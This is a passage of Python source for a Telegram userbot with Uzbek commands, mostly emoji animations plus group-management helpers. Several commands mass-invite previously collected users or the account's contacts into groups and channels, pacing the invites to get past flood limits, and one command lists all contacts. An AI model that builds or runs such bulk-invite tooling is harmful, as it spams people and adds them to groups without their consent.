    @cl.on(events.NewMessage(outgoing=True, pattern=r"\.yig.ilgan odamlar"))
    async def show_collected(event):
        if not collected_users:
            return await event.edit("⚠️ Hozircha baza bo'sh. Avval odam yig'ing.")
        msg = f"📊 **Jami yig'ilganlar: {len(collected_users)} ta**\n\n"
        for i, user in enumerate(collected_users[-20:], 1):
            msg += f"{i}. {user['name']} (ID: {user['id']})\n"
        if len(collected_users) > 20:
            msg += f"\n... va yana {len(collected_users)-20} ta foydalanuvchi."
        await event.edit(msg)

    # ── GURUHGA/KANALGA QO'SHISH ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.(guruhimga|kanalimga) odam qo.shish(?: (\d+) (\d+))?'))
    async def add_users_to_chat(event):
        args       = event.pattern_match.groups()
        is_channel = 'kanalimga' in event.text
        chats = []
        async for dialog in cl.iter_dialogs():
            if is_channel and dialog.is_channel and not dialog.is_group:
                chats.append(dialog)
            elif not is_channel and dialog.is_group:
                chats.append(dialog)
        if not args[1] or not args[2]:
            msg = f"**Qaysi {('guruh' if not is_channel else 'kanal')}ga qo'shamiz?**\n"
            for i, chat in enumerate(chats, 1):
                msg += f"{i}. {chat.name}\n"
            return await event.edit(msg)
        chat_idx = int(args[1]) - 1
        limit    = int(args[2])
        if 0 <= chat_idx < len(chats):
            target_chat = chats[chat_idx]
            if len(collected_users) < limit:
                return await event.edit(f"❌ Bazada bor-yo'g'i {len(collected_users)} ta odam bor.")
            await event.edit(f"🚀 `{target_chat.name}`ga {limit} ta odam qo'shish boshlandi...")
            success = 0
            for _ in range(limit):
                user_data = collected_users.pop(0)
                try:
                    await cl(InviteToChannelRequest(target_chat.entity, [user_data['id']]))
                    success += 1
                    await event.edit(f"🔄 Jarayon: {success}/{limit}\nQo'shildi: {user_data['name']}\nKutilmoqda: 5s...")
                except Exception:
                    continue
                await asyncio.sleep(5)
            await event.edit(f"✅ Tugatildi! {success} ta odam muvaffaqiyatli qo'shildi.")
        else:
            await event.edit("❌ Xato tartib raqami.")

    # ── KONTAKTLAR RO'YXATI ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r"\.kontaktlar ro.yxati"))
    async def list_contacts(event):
        await event.edit("🔄 **Kontaktlar bazasi yuklanmoqda...**")
        result   = await cl(functions.contacts.GetContactsRequest(hash=0))
        contacts = result.users
        if not contacts:
            return await event.edit("❌ Kontaktlar topilmadi.")
        total = len(contacts)
        await event.edit(f"📊 Jami **{total}** ta kontakt topildi. Tayyorlanmoqda...")
        await asyncio.sleep(2)
        chunk_size    = 80
        current_count = 0
        frames = ["🌑","🌒","🌓","🌔","🌕","🌖","🌗","🌘"]
        for i in range(0, total, chunk_size):
            chunk = contacts[i:i + chunk_size]
            text  = f"📋 **Kontaktlar ro'yxati ({i+1} - {min(i + chunk_size, total)}):**\n\n"
            for index, user in enumerate(chunk, start=i+1):
                name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                text += f"{index}. **{name}** | ID: `{user.id}`\n"
            await event.respond(text)
            current_count += len(chunk)
            if current_count < total:
                for frame in frames:
                    await event.edit(f"{frame} **Keyingi 80 ta kontakt tayyorlanmoqda...** ({current_count}/{total})")
                    await asyncio.sleep(0.4)
                await asyncio.sleep(1)
            else:
                await event.edit("✅ **Kontaktlar ro'yxatini olish muvaffaqiyatli yakunlandi!**")
        await asyncio.sleep(5)
        await event.delete()

    # ── CHATLAR ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.chatlar'))
    async def list_all_chats(event):
        text  = "🏘 **Guruh va Kanallar ro'yxati:**\n\n"
        index = 1
        async for dialog in cl.iter_dialogs():
            if dialog.is_group or dialog.is_channel:
                text += f"{index}. **{dialog.name}** | ID: `{dialog.id}`\n"
                index += 1
            if index > 30:
                break
        await event.edit(text)

    # ── ODAM QO'SHISH (kontaktlardan) ──
    @cl.on(events.NewMessage(outgoing=True, pattern=r"\.odam qo.shish (\d+) (\d+)"))
    async def add_to_group(event):
        chat_idx = int(event.pattern_match.group(1))
        amount   = int(event.pattern_match.group(2))
        await event.edit("⚙️ Tayyorlanmoqda...")
        chats = []
        async for d in cl.iter_dialogs():
            if d.is_group or d.is_channel:
                chats.append(d)
        if chat_idx > len(chats) or chat_idx < 1:
            return await event.edit("❌ Xato! Bunday tartib raqamli chat yo'q.")
        target_chat = chats[chat_idx - 1]
        contacts    = await cl(functions.contacts.GetContactsRequest(hash=0))
        users_to_add = contacts.users[:amount]
        added  = 0
        failed = 0
        total  = len(users_to_add)
        await event.edit(f"🚀 **{target_chat.name}** guruhiga qo'shish boshlandi...")
        for i, user in enumerate(users_to_add, 1):
            name = f"{user.first_name or 'User'}"
            try:
                await event.edit(
                    f"⏳ **Qo'shilmoqda:** {name}\n"
                    f"📊 **Jarayon:** {i}/{total}\n"
                    f"✅ Muvaffaqiyatli: {added} | ❌ Xato: {failed}"
                )
                await cl(InviteToChannelRequest(channel=target_chat.entity, users=[user]))
                added += 1
                await event.respond(f"✅ {name} qo'shildi.")
            except UserPrivacyRestrictedError:
                failed += 1
                await event.respond(f"❌ {name} (Maxfiylik sozlamalari)")
            except UserChannelsTooMuchError:
                failed += 1
                await event.respond(f"❌ {name} (Guruhlari juda ko'p)")
            except PeerFloodError:
                await event.respond("⚠️ Spam blok! Amaliyot to'xtatildi.")
                break
            except FloodWaitError as e:
                await event.respond(f"⏳ Limit! {e.seconds} soniya kutilmoqda...")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                failed += 1
                await event.respond(f"❌ {name} qo'shilmadi (Xato: {type(e).__name__})")
            if i < total:
                await asyncio.sleep(5)
        summary = (
            f"🏁 **Tugatildi!**\n\n"
            f"📍 Guruh: {target_chat.name}\n"
            f"✅ Qo'shilganlar: {added}\n"
            f"❌ Qo'shilmaganlar: {failed}\n"
            f"📉 Umumiy urinish: {total}"
        )
        await event.respond(summary)
        await event.delete()

    # ── Avtomatik AI (lichkada) ──
    @cl.on(events.NewMessage(incoming=True))
    async def global_auto_respond(event):
        if not event.is_private:
            return
        me  = await cl.get_me()
        cfg = get_ub_cfg(me.id)
        if cfg["ai_active"] and not event.out:
            sender = await event.get_sender()
            if sender and sender.bot:
                return
            user_text = event.text
            if not user_text:
                return
            try:
                async with cl.action(event.chat_id, 'typing'):
                    await asyncio.sleep(1)
                    response = await get_ai_response(user_text, cfg["prompt"])
                    await event.reply(response)
            except Exception as e:
                print(f"Xato yuz berdi: {e}")

    # ══════════════════════════════════════════════════════════════
    #  ANIMATSIYALAR — ASLIDAN TO'LIQ NUSXA
    # ══════════════════════════════════════════════════════════════

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.func'))
    async def func_menu(event):
        await event.edit(
            "🎭 **NICO USERBOT: ANIMATSIYALAR** 🎭\n"
            "👮 `.police` - Police animatsiyasi\n"
            "⌨️ `.type [matn]` - Klaviaturada yozish effekti\n"
            "❤️ `.lovestory` - Animatsiyali yuraklar to'plami\n"
            "❤️ `.love` - Yurak animatsiyasi\n"
            "💔 `.break` - Yurak sinash animatsiyasi\n"
            "™️ `.rev` - Teskari matn\n"
            "🔥 `.boom` - Portlash va olov animatsiyasi\n"
            "⚡ `.load` - Yuklanmoqda animatsiyasi V1\n"
            "⚡ `.loading` - Yuklanmoqda animatsiyasi V2\n"
            "⚡ `.loading3` - Yuklanmoqda animatsiyasi V3\n"
            "☣️ `.scan` - Foydalanuvchini skanerlash animatsiyasi\n"
            "🎰 `.casino` - Omadni sinash\n"
            "🌍 `.earth` - Yer aylanishi animatsiyasi\n"
            "🧠 `.brain` - Miya tahlili animatsiyasi\n"
            "🧬 `.dna` - genlarni aniqlash animatsiyasi\n"
            "💧 `.rain` - Yomg'ir animatsiyasi\n"
            "🔥 `.dragon` - Olov purkash animatsiyasi\n"
            "🚕 `.taxi` - Taxi animatsiyasi\n"
            "⚡ `.thunder` - Chaqmoq animatsiyasi\n"
            "🎩 `.magic` - sehrli qalpoq animatsiyasi\n"
            "🥊 `.fight` - Boks animatsiyasi\n"
            "🛸 `.ufo` - olib ketish animatsiyasi\n"
            "🐟 `.fish` - Baliq ovi animatsiyasi\n"
            "🟦 `.tetris` - Tetris o'yini animatsiyasi\n"
            "🧐 `.detect` - Yolg'on detektor animatsiyasi\n"
            "☣️ `.virus` - Virus animatsiyasi\n"
            "🌆 `.galaxy` - Koinot bo'ylab sayohat animatsiyasi\n"
            "💥 `.mushak` - Mushakbozlar animatsiyasi\n"
            "🏡 `.build` - Uy qurish animatsiyasi\n"
            "⚡ `.flash` - Tezkor chaqmoq animatsiyasi\n"
            "🌡 `.temp` - Temperatura animatsiyasi\n"
            "• `.terminal` - Terminal buyruqlari animatsiyasi\n"
            "🛰 `.satellite` - Sun'iy yo'ldosh bilan ulanish animatsiyasi\n"
            "🌐 `.detect_os` - Qurilmani aniqlash animatsiyasi\n"
            "📂 `.unzip` - Zip faylni ochish animatsiyasi\n"
            "🔎 `.search` - Qidiruv animatsiyasi\n"
            "📡 `.connect` - Serverga ulanish animatsiyasi\n"
            "⚠️ `.destruct` - O'zini o'zi yo'q qiluvchi matn\n"
            "🔐 `.decrypt` - Shifrlangan matn animatsiyasi\n"
            "🧮 `.calc_pro` - Aqlli hisoblash\n"
            "❌ `.error` - Xato berish animatsiyasi\n"
            "🛫 `.flight` - Samolyot parvoz animatsiyasi\n"
            "📤 `.backup` - Ma'lumotlarni zaxiralash animatsiyasi\n"
            "🤖 `.think` - AI tahlil animatsiyasi\n"
            "🚜 `.traktor` - Traktor haydash animatsiyasi\n"
            "📡 `.radar` - Radar qidiruv animatsiyasi\n"
            "🕸 `.spider` - O'rgimchak to'ri animatsiyasi\n"
            "📈 `.grafik` - O'sish grafigi\n"
            "🔑 `.brute` - Password animatsiyasi\n"
            "⚔️ `.duel` - Urush duel animatsiyasi\n"
            "🌀 `.hole` - Qora tuynuk animatsiyasi\n"
            "🧪 `.lab` - Kimyoviy tajriba animatsiyasi\n"
            "🔋 `.charge` - Zaryadlash animatsiyasi\n"
            "🧊 `.ice` - Muzlash animatsiyasi\n"
            "⚡ `.shock` - Elektr toki animatsiyasi\n"
            "🎯 `.aim` - Nishonga olish animatsiyasi\n"
            "🚀 `.engine` - Dvigatel o't oldirish\n"
            "✅ `.skeleton` - Sayt tuzilishi animatsiyasi\n"
            "⚡ `.volt` - Elektr toki kuchlanish animatsiyasi\n"
            "🌀 `.vortex` - Girdob animatsiyasi\n"
            "🛰 `.gps` - Global qidiruv animatsiyasi\n"
            "💀 `.xavf` - Xavfli zona animatsiyasi\n"
            "⚡ `.storm` - Katta chaqmoq animatsiyasi\n"
            "🔒 `.lock` - Qulflash animatsiyasi\n"
            "🧱 `.wall` - Devor qurish animatsiyasi\n"
            "💣 `.nuke` - Portlash animatsiyasi\n"
            "💳 `.gen_card` - Bank kartasini generatsiya qilish animatsiyasi\n"
            "🚑 `.med` - Tez yordam animatsiyasi\n"
            "🌹 `.rose` - Gul animatsiyasi\n"
            "📜 `.letter` - Maktub sizni yaxshi ko'raman animatsiyasi\n"
            "🏹 `.love_shot` - Kapidan o'qi\n"
            "☁️❤️ `.cloud` - Osmondagi sevgi animatsiyasi\n"
            "🌊 `.ocean` - Sevgi ummonda animatsiyasi\n"
            "❤️ `.love_sevgi [ matn ]` - Sevgi animatsiyasi\n"
            "🎮 `.gameover` - O'zida yutqazish animatsiyasi\n"
            "🔺 `.pyramid` - Piramid animatsiyasi\n"
            "🌤 `.obhavo` - Ob-havo animatsiyasi\n"
            "🥘 `.pishir` - Pishiriq tayyorlash animatsiyasi\n"
            "🏀 `.sport` - Basketbol animatsiyasi\n"
            "🚬 `.smoke` - Sigaret hazil animatsiyasi\n"
            "💸 `.soqqa` - Pul animatsiyasi\n"
            "🚀 `.mars` - Kosmik parvoz animatsiyasi\n"
            "• `.poyga` - Formula animatsiyasi\n"
            "☕️ `.kofe` - Kofe ichish animatsiyasi\n"
            "🦅 `.tabiat` - Tabiat animatsiyasi\n"
            "📸 `.selfie` - Rasmga olish animatsiyasi\n"
            "🧛 `.vamp` - Yashirin ko'rinish animatsiyasi\n"
            "⛏ `.kovla` - Olmos topish animatsiyasi\n"
            "🎸 `.gitara` - Gitara animatsiyasi\n"
            "🥱 `.uyqu` - Uxlash animatsiyasi\n"
            "🎈 `.shar` - Shar uchish animatsiyasi\n"
            "☃️ `.snow` - Qor animatsiyasi\n\n"
            "✨ *Yaqinda yangi animatsiyalar qo'shiladi!*"
        )

    # ══ BARCHA ANIMATSIYALAR ══

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.police'))
    async def police_anim(event):
        if event.fwd_from:
            return
        animation_chars = [
            "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
            "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        ]
        for i in range(12):
            await asyncio.sleep(0.3)
            await event.edit(animation_chars[i % 2])

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.mute'))
    async def mute_user(event):
        chat = await event.get_chat()
        reply_to_message = await event.get_reply_message()
        if not reply_to_message:
            await event.delete()
            return
        time_flags_dict = {
            "m": [60, "daqiqa"],
            "h": [3600, "soat"],
            "d": [86400, "kun"]
        }
        try:
            time_type   = event.message.text[-1]
            count       = int(event.message.text.split()[1][:-1])
            count_secs  = count * time_flags_dict[time_type][0]
            rights = ChatBannedRights(
                until_date=datetime.datetime.utcnow() + datetime.timedelta(seconds=count_secs),
                send_messages=True
            )
            await cl(EditBannedRequest(chat.id, reply_to_message.sender_id, rights))
            await event.edit(f'🔇 **{count} {time_flags_dict[time_type][1]} davomida mute qilindi**')
        except Exception as e:
            print(e)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.loading3'))
    async def loading3(event):
        try:
            percentage = 0
            while percentage < 100:
                temp = 100 - percentage
                temp = temp if temp > 5 else 5
                percentage += temp / random.randint(5, 10)
                percentage = round(min(percentage, 100), 2)
                progress   = int(percentage // 5)
                await event.edit(f'`|{"█" * progress}{"-" * (20 - progress)}| {percentage}%`')
                await asyncio.sleep(0.5)
            await asyncio.sleep(3)
            await event.delete()
        except Exception as e:
            print(e)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.snow'))
    async def snow(message):
        await message.edit('☁️🌨☁️🌨☁️🌨☁️🌨☁️🌨☁️\n\n\n\n\n\n⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️')
        await asyncio.sleep(0.75)
        await message.edit('☁️🌨☁️🌨☁️🌨☁️🌨☁️🌨☁️\n    ❄️    ❄️     ❄️     ❄️     ❄️   ❄️\n\n\n\n\n⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️')
        await asyncio.sleep(0.75)
        await message.edit('☁️🌨☁️🌨☁️🌨☁️🌨☁️🌨☁️\n    ❄️    ❄️     ❄️     ❄️     ❄️   ❄️\n❄️    ❄️    ❄️    ❄️    ❄️    ❄️       \n\n\n\n⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️')
        await asyncio.sleep(0.75)
        await message.edit('☁️🌨☁️🌨☁️🌨☁️🌨☁️🌨☁️\n    ❄️    ❄️     ❄️     ❄️     ❄️   ❄️\n❄️    ❄️    ❄️    ❄️    ❄️    ❄️       \n    ❄️    ❄️    ❄️    ❄️    ❄️    ❄️     \n\n\n⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️')
        await asyncio.sleep(0.75)
        await message.edit('☁️🌨☁️🌨☁️🌨☁️🌨☁️🌨☁️\n    ❄️    ❄️     ❄️     ❄️     ❄️   ❄️\n❄️    ❄️    ❄️    ❄️    ❄️    ❄️       \n    ❄️    ❄️    ❄️    ❄️    ❄️    ❄️     \n❄️    ❄️    ❄️    ❄️    ❄️    ❄️     \n\n⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️')
        await asyncio.sleep(0.75)
        await message.edit('☁️🌨☁️🌨☁️🌨☁️🌨☁️🌨☁️\n    ❄️    ❄️     ❄️     ❄️     ❄️   ❄️\n❄️    ❄️    ❄️    ❄️    ❄️    ❄️       \n    ❄️    ❄️    ❄️    ❄️    ❄️    ❄️     \n❄️    ❄️    ❄️    ❄️    ❄️    ❄️     \n  ❄️      ❄️    ❄️  ❄️      ❄️  ❄️ \n⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️☃️⛄️')
        await asyncio.sleep(1.25)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.shar'))
    async def balloon_anim(event):
        for frame in ["🎈\n🏠","🎈\n\n🏠","🎈\n\n\n☁️","☁️ 🎈 ☁️","✨ **Kechirasiz, xabar uchib ketdi!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.uyqu'))
    async def sleep_anim(event):
        for frame in ["🥱 (Charchadim...)","🛌 (Yotdim...)","💤 Zzz...","💤 Zzz... Zzz...","💤 Zzz... Zzz... Zzz...","🌙 **Xayrli tun!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.8)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.gitara'))
    async def guitar_anim(event):
        frames = ["🎸  ♪","🎸    ♫","🎸  ♪ ♫","🎸 🎼 ♪ ♫","🤘 **Rok-yulduz sahnada!**","👏 **Rahmat, rahmat!**"]
        for _ in range(2):
            for frame in frames[:4]:
                await event.edit(f"<code>{frame}</code>", parse_mode='html')
                await asyncio.sleep(0.4)
        await event.edit(frames[4])
        await asyncio.sleep(0.8)
        await event.edit(frames[5])

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.kovla'))
    async def mine_anim(event):
        for frame in ["⛏🪨🪨🪨","⛏ 🪨🪨","⛏  🪨","⛏   💎","⛏  ✨💎✨","💰 **Boy bo'lib ketdik!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.vamp'))
    async def vamp_anim(event):
        for frame in ["😐 Men oddiy odamman...","🤨 Nega menga qarayapsan?","🌑 Tun tushdi...","🦇","🧛 **SENI YEYMAN!**","😂 **Hazillashdim!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.8)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.selfie'))
    async def selfie_anim(event):
        for frame, delay in [("📸 **Tayyormisiz?**",0.7),("📸 **3...**",0.7),("📸 **2...**",0.7),("📸 **1...**",0.7),("⚪️ **CHEESSSS!**",0.2),("🖼 **Rasm tayyor!**",1.0)]:
            await event.edit(frame)
            await asyncio.sleep(delay)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.tabiat'))
    async def nature_anim(event):
        for frame in ["☁️          ☁️","☁️    🦅    ☁️","🌲🌲🌲🌲🌲🌲","🌲🌲🌲🌲🌲🌲\n      🦌","🌲🌲🌲🌲🌲🌲\n      🐇","✨ **Tabiat go'zalligi!** ✨"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.kofe'))
    async def coffee_time(event):
        for frame in ["☕️ (Ozgina dam olamiz...)","♨️ ☕️ (Hidi juda mazali...)","☕️ 😋 (Bir xo'plam...)","☕️ ✨ (Energiya to'ldi!)","💪 **Ishni davom ettiramiz!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.8)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.poyga'))
    async def race_anim(event):
        track = "________________"
        for i in range(len(track)):
            current_track    = list(track)
            current_track[i] = "🏎💨"
            await event.edit(f"<code>🏁{''.join(current_track)}</code>", parse_mode='html')
            await asyncio.sleep(0.2)
        await event.edit("🏆 **MARRAGA BIRINCHI KELDIK!**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.mars'))
    async def mars_travel(event):
        for frame in ["🚀\n\n🏢🏢🏢","🔥\n🚀\n\n🏢🏢","☁️\n  🚀\n\n☁️","✨\n   🚀\n      ✨","🪐\n      🚀","👨‍🚀 **Marsga yetib keldik!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.soqqa'))
    async def money_anim(event):
        for frame in ["💸","💸 💸","💸 💸 💸","💸 💸 💸 💸","💰 💰 💰 💰","🏦 **Kassa to'ldi!**","🤑 **Millioner bo'lib ketdik!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.smoke'))
    async def smoke_anim(event):
        frames = ["🚬","🚬 ☁️","🚬 ☁️☁️","🚬 ☁️☁️☁️","🚬 ☁️☁️","🚬 ☁️","🚬","💨"," "]
        for _ in range(2):
            for frame in frames:
                await event.edit(frame)
                await asyncio.sleep(0.3)
        await event.edit("🚫 **Sog'liq uchun zararli!**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.sport'))
    async def sport_anim(event):
        for frame in ["🏀      🗑","  🏀    🗑","    🏀  🗑","      🏀🗑","      🗑✨","🔥 **GOOOOL! 3 ochkolik zarba!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.pishir'))
    async def cook_anim(event):
        for frame in ["🥣 Masalliqlarni tayyorlaymiz...","🔪 Maydalaymiz...","🥘 Qozonga soldik...","🔥 Pishmoqda (0%... 50%... 90%)","🍱 Taom tayyor! Yoqimli ishtaha!","😋 Juda mazali chiqdi."]:
            await event.edit(f"<i>{frame}</i>", parse_mode='html')
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.obhavo'))
    async def weather_anim(event):
        for frame in ["☀️ Musaffo osmon...","🌤 Bulutlar kela boshladi...","☁️ Kun bulutli bo'ldi.","🌧 Yomg'ir yog'ishi kutilmoqda...","⛈ Guldurak! Chaqmoq chaqdi!","🌈 Yomg'ir tugadi. Kamalak chiqdi!"]:
            await event.edit(f"<b>{frame}</b>", parse_mode='html')
            await asyncio.sleep(0.7)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.pyramid'))
    async def pyramid_anim(event):
        for frame in ["      🔺      ","     🔺🔺     ","    🔺🔺🔺    ","   🔺🔺🔺🔺   ","  🔺🔺🔺🔺🔺  ","✨ **Piramida tayyor!** ✨"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.gameover'))
    async def game_over_anim(event):
        for frame in ["🎮 **O'YIN BOSHLANDI...**","👾 **Dushmanlar hujumi!**","💔 **Jon kamaydi...**","💀 **G A M E  O V E R**","🛑 **RESTARTING...**"]:
            await event.edit(frame)
            await asyncio.sleep(0.7)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.love_sevgi (.+)'))
    async def heart_frame_anim(event):
        input_text   = event.pattern_match.group(1)
        hearts       = ["❤️","💖","💗","💓","💝","💕"]
        current_text = ""
        for char in input_text:
            current_text += char
            h     = random.choice(hearts)
            frame = (
                f"{h}{h}{h}{h}{h}{h}\n"
                f"{h}          {h}\n"
                f"{h}  {current_text.center(6)}  {h}\n"
                f"{h}          {h}\n"
                f"{h}{h}{h}{h}{h}{h}"
            )
            try:
                await event.edit(f"<code>{frame}</code>", parse_mode='html')
                await asyncio.sleep(0.4)
            except Exception:
                break
        await asyncio.sleep(1.5)
        for effect in ["💥","💨"," "]:
            await event.edit(effect)
            await asyncio.sleep(0.4)
        await event.delete()

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.ocean'))
    async def ocean_anim(event):
        for frame in ["🌊🌊🌊🌊🌊","🌊🌊🤍🌊🌊","🌊🤍🤍🤍🌊","🏝 ❤️ **LOVING YOU**","🌊🌊🌊🌊🌊"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.cloud'))
    async def cloud_love(event):
        for frame in ["☁️      ☁️","☁️  🤍  ☁️","☁️ ❤️ ☁️","✨ ❤️ ✨","☀️ **Siz mening quyoshimsiz!**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.love_shot'))
    async def cupid_anim(event):
        for frame in ["🏹      ❤️","🏹💨    ❤️","🏹  💨  ❤️","🏹    💨❤️","🏹      💘","✨ **Nishon aniq!** ✨"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.letter'))
    async def letter_anim(event):
        for frame in ["✉️","📩","📨","📬","📖","📜","📜 **Mening qalbimdan...**","📜 **Sizga kichik maktub:**","❤️ **Sizni yaxshi ko'raman!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.rose'))
    async def rose_anim(event):
        for frame in ["🌱","🌿","🪴","🎍","🌷","🌹","🥀","🌺","🌸","🌼","🌻","💐 **Bu gullar sizga!** 💐"]:
            await event.edit(frame)
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.med'))
    async def med_anim(event):
        road = "________________"
        for i in range(len(road)):
            current_road    = list(road)
            current_road[i] = "🚑"
            await event.edit(f"<code>{''.join(current_road)}</code>", parse_mode='html')
            await asyncio.sleep(0.2)
        await event.edit("🚑 **Bemor shifoxonaga yetkazildi!**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.gen_card'))
    async def card_anim(event):
        await event.edit("💳 **Virtual karta yaratilmoqda...**")
        formatted = ""
        for _ in range(5):
            num       = "".join(random.choice("0123456789") for _ in range(16))
            formatted = " ".join([num[i:i+4] for i in range(0, 16, 4)])
            await event.edit(f"💳 <code>{formatted}</code>", parse_mode='html')
            await asyncio.sleep(0.3)
        await event.edit(f"💳 <code>{formatted}</code>\n📅 **Muddati:** 12/30\n✅ **Karta faol!**", parse_mode='html')

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.nuke'))
    async def nuke_anim(event):
        for frame in ["🚀","🚀\n      🏢","🚀\n    🏢🏢","💥","🔥💥🔥","☁️☁️☁️","💀 **HUDUD YO'Q QILINDI!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.wall'))
    async def wall_build(event):
        for frame in ["🧱","🧱🧱","🧱🧱🧱","🧱🧱🧱\n🧱🧱🧱","🧱🧱🧱\n🧱🧱🧱\n🧱🧱🧱","🛡 **HIMOYA DEVORI TAYYOR!**"]:
            await event.edit(frame)
            await asyncio.sleep(0.5)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.lock'))
    async def lock_target(event):
        if not event.is_reply:
            return await event.edit("⚠️ **Xabarga reply qiling!**")
        for i in range(10, 101, 20):
            await event.edit(f"🎯 **Nishon qidirilmoqda...** <code>{i}%</code>", parse_mode='html')
            await asyncio.sleep(0.4)
        await event.edit("🔒 **NISHON QULFLANDI!**\n🚀 **Professional Userbot zarbaga tayyor.**")

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.storm'))
    async def storm_anim(event):
        for frame in ["☁️☁️☁️☁️☁️","☁️☁️⚡️☁️☁️","☁️⚡️⚡️⚡️☁️","⚡️⚡️💥⚡️⚡️","☁️☁️🌈☁️☁️","✨ **Bo'ron tugadi.**"]:
            await event.edit(f"<code>{frame}</code>", parse_mode='html')
            await asyncio.sleep(0.4)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.xavf'))
    async def xavf_anim(event):
        for frame in ["☣️","⚠️ ☣️ ⚠️","🛑 ☣️ 🛑","💀 **XAVFLI ZONA!**","☣️ **PROFESSIONAL USERBOT HIMOYASIDA!**"]:
            await event.edit(f"<b>{frame}</b>", parse_mode='html')
            await asyncio.sleep(0.6)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.gps'))
    async def gps_anim(event):
        for step in ["🛰 **Sputnik ulanmoqda...**","🗺 **Xarita yuklanmoqda...**",
                     "📍 **Koordinata:** <code>41.0001° N, 71.6726° E</code>",
                     "🏙 **Hudud:** <code>Namangan, Pop</code>","✅ **Titan Pro manzili aniqlandi!**"]:
            await event.edit(step, parse_mode='html')
            await asyncio.sleep(0.7)

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.vortex'))
    async def vortex_anim(event):
        frames = ["🌀 . . . .","• 🌀 . . .","• • 🌀 . .","• • • 🌀 .","• • • • 🌀","✨ **Titan Pro Girdobi tugadi!**"]
        for _ in range(2):
            for frame in frames[:5]:
                await event.edit(f"<code>{frame}</code>", parse_mode='html')
                await asyncio.sleep(0.3)
        await event.edit(frames[5])

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.volt'))
    async def voltage_anim(event):
        for v in range(0, 230, 45):
            await event.edit(f"⚡️ **Kuchlanish:** <code>{v} V</code>", parse_mode='html')
            await asyncio.sleep(0.4)
        await event.edit("⚡️ **Kuchlanish:** <code>220 V</code>\n✅ **Tizim barqaror ishlayapti!**", parse_mode='html')

    @cl.on(events.NewMessage(outgoing=True, pattern=r'\.skeleton'))
    async def skeleton_anim(event):
        for frame in ["|--------------|","|  [        ]  |\n|--------------|",
                      "|  [ TITAN  ]  |\n|--------------|\n|  |   |   |   |",
                      "|  [ TITAN  ]  |\n|--------------|\n|  |PRO| V25|  |","✅ **Interface Compiled!**"]:
